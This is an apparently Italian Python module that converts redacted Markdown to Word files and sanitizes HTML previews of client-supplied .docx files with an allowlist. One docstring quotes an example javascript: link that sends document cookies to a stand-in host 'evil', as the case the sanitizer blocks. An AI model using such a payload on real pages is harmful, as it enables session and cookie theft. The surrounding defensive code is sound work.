# Mr. Rao -- Copyright (c) 2026 Antonio Andrea Rao.
# SPDX-License-Identifier: AGPL-3.0-or-later
# Software libero: puoi ridistribuirlo e/o modificarlo secondo i termini della
# GNU Affero General Public License pubblicata dalla Free Software Foundation,
# versione 3 o (a tua scelta) successiva. Vedi LICENSE nella radice del repository.
"""Dal Markdown redatto a un .docx, per i documenti che devono restare documenti.

Fino alla 1.9.0 l'uscita era solo `.md` e `.txt`, e questo legava Mr. Rao a un
caso d'uso solo: incollare in un'AI. Ma un atto da pubblicare all'albo, un
contratto da depositare, una delibera anonimizzata **devono restare
documenti** -- e in Markdown non lo sono.

## Cosa si converte, e cosa no

Si converte il sottoinsieme di Markdown che Mr. Rao *produce*, non tutto il
Markdown esistente: intestazioni, paragrafi, elenchi puntati e numerati,
tabelle, citazioni, righelli, blocchi di codice, piu' grassetto e corsivo
dentro la riga. Quello che il convertitore non genera non e' gestito, e non
si finge il contrario.

## La cosa importante da capire

Questo **non** e' «il PDF originale con sopra dei rettangoli neri». Quella e'
la trappola classica della redazione: i rettangoli si tolgono e il testo e'
ancora li' sotto, e ogni anno qualcuno pubblica un atto giudiziario cosi'.

Qui il documento viene **rigenerato dal Markdown gia' redatto**, quindi il
dato personale non c'e' proprio -- non e' coperto, e' assente. Il prezzo e'
che l'impaginazione dell'originale si perde: quello che esce e' un documento
pulito e leggibile, non una fotocopia dell'originale con dei buchi.
"""
from __future__ import annotations

import io
import re

from mr_rao.i18n import LINGUA_PREDEFINITA, t

# Frontmatter YAML: nel .md serve a chi automatizza, in un documento da
# stampare e' rumore. Stesso trattamento del download .txt.
_RE_FRONTMATTER = re.compile(r"\A---\n.*?\n---\n+", re.S)

# Spazio **orizzontale**, non `\s`. Sono espressioni che guardano una riga
# alla volta, e `\s` comprende anche il ritorno a capo: accanto a `.*$`, che
# il ritorno a capo non lo attraversa, quella sovrapposizione apre un
# retrocedere quadratico su righe fatte di molti spazi — segnalato da CodeQL
# (py/polynomial-redos) e vero, perche' il testo arriva da un documento
# altrui e una scansione storta di spazi ne produce a volonta'.
#
# `[ \t]` dice quello che queste righe intendevano dire fin dall'inizio.
#
# L'unico caso in cui la risposta cambia e' una stringa che contiene un
# ritorno a capo: `\s` lo attraversava, `[ \t]` no. Non puo' accadere —
# `markdown_to_docx` lavora su `testo.split("\n")` — e c'e' un test che
# tiene ferma quella premessa, perche' e' su di essa che poggia il cambio.
_ORIZZ = r"[ \t]"

# E niente `$` in fondo dove il gruppo finale e' gia' `(.*)`.
#
# E' li' che stava il costo, e la prima correzione l'aveva peggiorato: con
# `\s+`, che il ritorno a capo lo attraversa, il motore arrivava in fondo al
# primo colpo; con `[ \t]+` si ferma prima del ritorno a capo, `$` fallisce,
# e a quel punto retrocede su ognuno dei ventimila spazi. Misurato: da
# istantaneo a 885 ms.
#
# `(.*)` da solo cattura esattamente le stesse cose — `.` non attraversa il
# ritorno a capo e queste espressioni ricevono una riga alla volta — ma non
# ha piu' un modo di fallire, quindi non ha piu' niente da riprovare.
_RE_INTESTAZIONE = re.compile(rf"^(#{{1,6}}){_ORIZZ}+(.*)")
_RE_ELENCO = re.compile(rf"^{_ORIZZ}*[-*+]{_ORIZZ}+(.*)")
_RE_NUMERATO = re.compile(rf"^{_ORIZZ}*\d+[.)]{_ORIZZ}+(.*)")
_RE_CITAZIONE = re.compile(rf"^>{_ORIZZ}?(.*)")
_RE_RIGHELLO = re.compile(rf"^{_ORIZZ}*([-*_]){_ORIZZ}*(?:\1{_ORIZZ}*){{2,}}$")
_RE_RIGA_TABELLA = re.compile(rf"^{_ORIZZ}*\|.*\|{_ORIZZ}*$")
_RE_SEPARATORE_TABELLA = re.compile(rf"^{_ORIZZ}*\|[ \t:|-]+\|{_ORIZZ}*$")

# Grassetto e corsivo. L'ordine conta: `**` prima di `*`, altrimenti il
# secondo si mangia il primo lasciando asterischi orfani nel documento.
_RE_INLINE = re.compile(r"(\*\*[^*]+\*\*|__[^_]+__|\*[^*]+\*|_[^_]+_|`[^`]+`)")


def _celle(riga: str) -> list[str]:
    return [c.strip() for c in riga.strip().strip("|").split("|")]


def _scrivi_riga(paragrafo, testo: str) -> None:
    """Aggiunge il testo al paragrafo, rendendo grassetto/corsivo/codice.

    I segnaposto della redazione -- ``{{EMAIL}}``, ``{{IBAN}}`` -- restano
    testo normale di proposito: evidenziarli renderebbe piu' facile, per chi
    riceve il documento, individuare dove c'era un dato e quanti erano.
    """
    for pezzo in _RE_INLINE.split(testo):
        if not pezzo:
            continue
        if (pezzo.startswith("**") and pezzo.endswith("**")) or (
            pezzo.startswith("__") and pezzo.endswith("__")
        ):
            paragrafo.add_run(pezzo[2:-2]).bold = True
        elif (pezzo.startswith("*") and pezzo.endswith("*")) or (
            pezzo.startswith("_") and pezzo.endswith("_")
        ):
            paragrafo.add_run(pezzo[1:-1]).italic = True
        elif pezzo.startswith("`") and pezzo.endswith("`"):
            corsa = paragrafo.add_run(pezzo[1:-1])
            corsa.font.name = "Consolas"
        else:
            paragrafo.add_run(pezzo)


def markdown_to_docx(
    markdown: str,
    titolo: str | None = None,
    lingua: str = LINGUA_PREDEFINITA,
) -> bytes:
    """Markdown redatto -> .docx, restituito come byte."""
    from docx import Document
    from docx.shared import Pt

    testo = _RE_FRONTMATTER.sub("", markdown or "")
    doc = Document()

    if titolo:
        doc.add_heading(titolo, level=0)

    righe = testo.split("\n")
    i = 0
    while i < len(righe):
        riga = righe[i]

        if not riga.strip():
            i += 1
            continue

        # Blocco di codice: si copia dentro senza interpretarlo, altrimenti
        # un asterisco in un frammento di codice diventerebbe corsivo.
        if riga.lstrip().startswith("```"):
            i += 1
            dentro = []
            while i < len(righe) and not righe[i].lstrip().startswith("```"):
                dentro.append(righe[i])
                i += 1
            i += 1
            p = doc.add_paragraph()
            corsa = p.add_run("\n".join(dentro))
            corsa.font.name = "Consolas"
            corsa.font.size = Pt(9)
            continue

        if _RE_RIGHELLO.match(riga):
            doc.add_paragraph().add_run().add_break()
            i += 1
            continue

        # Tabella: si raccolgono tutte le righe consecutive che iniziano con
        # una barra, poi si costruisce in un colpo solo -- python-docx vuole
        # sapere le dimensioni prima.
        if _RE_RIGA_TABELLA.match(riga):
            blocco = []
            while i < len(righe) and _RE_RIGA_TABELLA.match(righe[i]):
                if not _RE_SEPARATORE_TABELLA.match(righe[i]):
                    blocco.append(_celle(righe[i]))
                i += 1
            if blocco:
                larghezza = max(len(r) for r in blocco)
                tabella = doc.add_table(rows=len(blocco), cols=larghezza)
                tabella.style = "Table Grid"
                for r, valori in enumerate(blocco):
                    for c in range(larghezza):
                        cella = tabella.cell(r, c)
                        cella.text = ""
                        _scrivi_riga(cella.paragraphs[0], valori[c] if c < len(valori) else "")
                        if r == 0:
                            for corsa in cella.paragraphs[0].runs:
                                corsa.bold = True
            continue

        m = _RE_INTESTAZIONE.match(riga)
        if m:
            doc.add_heading(m.group(2).strip(), level=min(len(m.group(1)), 6))
            i += 1
            continue

        m = _RE_CITAZIONE.match(riga)
        if m:
            p = doc.add_paragraph(style="Intense Quote")
            _scrivi_riga(p, m.group(1))
            i += 1
            continue

        m = _RE_ELENCO.match(riga)
        if m:
            _scrivi_riga(doc.add_paragraph(style="List Bullet"), m.group(1))
            i += 1
            continue

        m = _RE_NUMERATO.match(riga)
        if m:
            _scrivi_riga(doc.add_paragraph(style="List Number"), m.group(1))
            i += 1
            continue

        # Paragrafo: le righe consecutive si uniscono, perche' nel Markdown
        # un a capo singolo non e' un paragrafo nuovo.
        blocco = []
        while i < len(righe) and righe[i].strip() and not _e_speciale(righe[i]):
            blocco.append(righe[i].strip())
            i += 1
        _scrivi_riga(doc.add_paragraph(), " ".join(blocco))

    fuori = io.BytesIO()
    doc.save(fuori)
    return fuori.getvalue()


def _e_speciale(riga: str) -> bool:
    """La riga apre un blocco diverso da un paragrafo."""
    return bool(
        _RE_INTESTAZIONE.match(riga)
        or _RE_ELENCO.match(riga)
        or _RE_NUMERATO.match(riga)
        or _RE_CITAZIONE.match(riga)
        or _RE_RIGHELLO.match(riga)
        or _RE_RIGA_TABELLA.match(riga)
        or riga.lstrip().startswith("```")
    )


def html_da_docx(dati: bytes) -> str:
    """Contenuto di un .docx come HTML. Non e' l'impaginazione.

    Un .docx non ha pagine finche' qualcuno non lo impagina, e Word non
    e' una dipendenza. mammoth e' gia' nel pacchetto -- e' quello che
    MarkItDown usa per *leggere* i .docx -- e rende il contenuto, non
    il foglio. L'anteprima prima/dopo lo dice a schermo: chi guarda
    non deve concludere che il documento consegnato sara' cosi'.

    Le immagini si omettono: il confronto e' sul testo, e un data-uri
    da due megabyte nel JSON non aiuta a vedere un nome sparito.

    ## Perche' si ripulisce con un parser e non con due regex

    Questo HTML finisce in pagina con `innerHTML`, e il .docx da cui
    viene non e' nostro: e' quello che un cliente ha mandato. Togliere
    `<script>` e gli `on*=` sembrava bastare -- mammoth emette un
    insieme chiuso di elementi -- ma **i collegamenti li emette**, e
    l'indirizzo di un collegamento in un .docx lo sceglie chi scrive il
    documento. Misurato: un `.docx` con un rel `Target="javascript:..."`
    produceva `<a href="javascript:fetch('http://evil/'+document.cookie)">`,
    che passava indenne da tutte e due le regex.

    Per un prodotto che esiste per aprire documenti ricevuti da terzi,
    quello e' il caso normale, non il caso limite. Quindi non si elenca
    cio' che e' vietato -- si tiene solo cio' che serve: gli elementi
    del contenuto, gli attributi che li descrivono, e negli indirizzi i
    soli schemi che non eseguono niente.
    """
    import mammoth
    from bs4 import BeautifulSoup

    def _niente(_image):
        return []

    risultato = mammoth.convert_to_html(io.BytesIO(dati), convert_image=_niente)
    grezzo = risultato.value or ""
    if not grezzo:
        return ""

    soup = BeautifulSoup(grezzo, "html.parser")
    for tag in soup.find_all(True):
        if tag.name not in _TAG_AMMESSI:
            # `unwrap` tiene il testo: un elemento che non conosciamo non
            # deve far sparire il contenuto che l'utente deve confrontare.
            tag.unwrap()
            continue
        for nome in list(tag.attrs):
            if nome not in _ATTR_AMMESSI:
                del tag[nome]
            elif nome in ("href", "src") and not _indirizzo_innocuo(tag[nome]):
                del tag[nome]
    return str(soup)


#: Elementi di contenuto che mammoth produce davvero.
_TAG_AMMESSI = frozenset({
    "p", "br", "h1", "h2", "h3", "h4", "h5", "h6",
    "strong", "b", "em", "i", "u", "s", "sub", "sup",
    "ul", "ol", "li", "blockquote", "pre", "code",
    "table", "thead", "tbody", "tr", "th", "td", "a", "span", "div",
})

_ATTR_AMMESSI = frozenset({"href", "colspan", "rowspan"})

_SCHEMI_INNOCUI = ("http://", "https://", "mailto:")


def _indirizzo_innocuo(valore: str) -> bool:
    """Un indirizzo che, cliccato, non esegue niente.

    Si normalizza prima di guardare: `JaVaScRiPt:`, gli spazi e i
    caratteri di controllo in mezzo (`java\\tscript:`) sono il modo
    classico di far passare uno schema per un altro.
    """
    if not isinstance(valore, str):
        return False
    pulito = re.sub(r"[\s\x00-\x1f]+", "", valore).lower()
    if pulito.startswith(("#", "/")):
        return True
    if ":" not in pulito.split("/")[0]:
        # Nessuno schema: relativo, quindi non esegue niente.
        return True
    return pulito.startswith(_SCHEMI_INNOCUI)


def docx_disponibile() -> bool:
    """python-docx e' installato? Il portable lo ha, un venv scarno forse no."""
    try:
        import docx  # noqa: F401
    except ImportError:
        return False
    return True
